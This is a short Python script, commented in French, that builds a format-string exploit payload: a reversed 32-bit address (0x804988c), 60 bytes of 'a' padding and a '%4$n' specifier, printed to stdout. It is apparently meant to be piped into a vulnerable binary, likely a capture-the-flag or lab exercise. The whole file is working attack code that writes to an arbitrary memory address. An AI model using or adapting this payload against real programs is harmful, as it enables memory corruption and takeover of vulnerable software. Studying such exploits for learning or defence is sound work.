fill_with_a = "a" * 60 # +4 octet de l'adresse

adresse_res_dup = "\x8c\x98\x04\x08" # 0x804988c ecrire a l'envers octet par octet

payload =  adresse_res_dup + fill_with_a + "%4$n"

import sys
sys.stdout.write(payload)